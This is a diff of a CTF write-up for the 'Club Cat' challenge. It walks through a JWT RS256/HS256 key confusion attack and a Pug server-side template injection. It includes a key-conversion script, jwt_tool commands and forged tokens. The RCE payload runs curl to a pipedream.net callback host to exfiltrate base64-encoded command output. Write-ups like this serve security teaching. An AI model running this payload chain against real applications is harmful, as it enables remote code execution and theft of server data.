@@ -1,28 +1,34 @@
+##**Key Confusion Attack with JWT and Pug SSTI**
+
 ## **Description**
 People are always complaining that there's not enough cat pictures on the internet.. Something must be done!!
 <br></br>
 
-Reading the source code foud that JWT Rs256 keys are publicly accesable on /jwks.json route.
+1. Identifying the Attack Surface
+While reading through the source code, I discovered that the RS256 JWT keys were publicly accessible via the /jwks.json route. 
 <img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/Capture.PNG">
 <br></br>
-So We can make a key confusion attack as descriped here
+This gives us the ability to perform a key confusion attack, as described here
 <br></br>
 https://portswigger.net/web-security/jwt/algorithm-confusion
 
-Reading more the source code found a route called /cats and there pug ssti in the username that been taken from the jwt token
+Further investigation revealed a route called /cats, which processes a Pug SSTI (Server-Side Template Injection) vulnerability in the username parameter. This username is directly extracted from the JWT token.
 <br></br>
 <img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/2.PNG">
 <br></br>
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs 
 <br></br>
-So After things been clear to as the attak surface will be:
-1- Getting the RS256 Keys 
-2- Make a key confsion attack to inject what we want in the username 
-3- Pug SSti
-4- get RCE and read the flag
+2. Attack Strategy
+Based on the information, the attack surface could be summarized as follows:
+
+Retrieve the RS256 keys from the /jwks.json endpoint.
+Perform a key confusion attack to inject a payload into the username.
+Exploit the Pug SSTI vulnerability.
+Gain Remote Code Execution (RCE) and read the flag.
 <br></br>
 
-I used a script to convert the rs256 into .pem file so i can use it with jwt_tool : 
+3. Exploiting RS256 Key Confusion
+To proceed, I used a script to convert the RS256 key into a .pem file, which could be used with jwt_tool. This allowed me to manipulate the JWT token.
 ```py
 import base64
 from cryptography.hazmat.primitives.asymmetric import rsa
@@ -70,12 +76,13 @@ dwIDAQAB
 ```
 <br></br>
 
-Let's create an account and take the jwt token
+4. JWT Token Manipulation
+Next, I created an account and captured the JWT token. Afterward, I used jwt_tool to craft a custom token that exploited the SSTI vulnerability by injecting arbitrary code into the username field.
 <img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/3.PNG">
 <img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/4.PNG">
 
 <br></br>
-let's use jwt_tool
+And then use jwt_tool
 ```sh
 $ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFzZCJ9.WtNj-PzZesPRM7CZqAXXauI3TV6DcliuJbVzFOaqWajtLk96VzBjMTxap5hT9d09xraiu2CgCoX1dEg8ACpyPWfmOmxgLdwZvnL1qjjhv3ErwakYSJsn-Fe8WGeqDu4ZeSxjwR7xFjQXSBlvG9WytuWlpNBG6jM_6tY12euNs2oUW8VMV2HJM_GOEfwOMrb8lsV5JChgE3Eea9Uqa-DSpNkBvOlgWXo1gjgmlFP6TWDvxLA24O986jwFlBibxvVOOlsYhXuqiZUI-ynSxT8ZdivLYgOG58oxtvvbFuiXYc9fnSXC97eMnx_kXVE1RrYzQD_ZPC3o4CaqFK465_RK2g -X k -pk ~/Downloads/web/app/public_key.pem -I -pc username -pv "#{7*7}"
 
@@ -94,16 +101,17 @@ It worked!, now let's see where the flag is, From the Dockerfile we can see that
 
 [+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9lb2djZTh0Z3VqZmdrNWYubS5waXBlZHJlYW0ubmV0Pz1gbHMgL3xiYXNlNjRgJyl9KCl9In0.PxWfN3-n3u4IxcWorBADNw52W-NFJ491nrf5ATz9WNs 
 ```
-and we got a callback
+And we got a callback
 <br></br>
 <img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/8.PNG">
 <br></br>
-Then we got the flag name: 
+Then we got the flag file name: 
 <br></br>
 <img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/1337UP%20CTF/Club%20Cat/images/9.PNG">
 <br></br>
 
-And finally let's read the flag
+5. Getting the Flag
+
 ```sh
 $ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFzZCJ9.WtNj-PzZesPRM7CZqAXXauI3TV6DcliuJbVzFOaqWajtLk96VzBjMTxap5hT9d09xraiu2CgCoX1dEg8ACpyPWfmOmxgLdwZvnL1qjjhv3ErwakYSJsn-Fe8WGeqDu4ZeSxjwR7xFjQXSBlvG9WytuWlpNBG6jM_6tY12euNs2oUW8VMV2HJM_GOEfwOMrb8lsV5JChgE3Eea9Uqa-DSpNkBvOlgWXo1gjgmlFP6TWDvxLA24O986jwFlBibxvVOOlsYhXuqiZUI-ynSxT8ZdivLYgOG58oxtvvbFuiXYc9fnSXC97eMnx_kXVE1RrYzQD_ZPC3o4CaqFK465_RK2g -X k -pk ~/Downloads/web/app/public_key.pem -I -pc username -pv "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('curl https://eogce8tgujfgk5f.m.pipedream.net?=\`ls /flag_Gx4wVbEc1fxN9ztM.txt|base64\`')}()}"
 
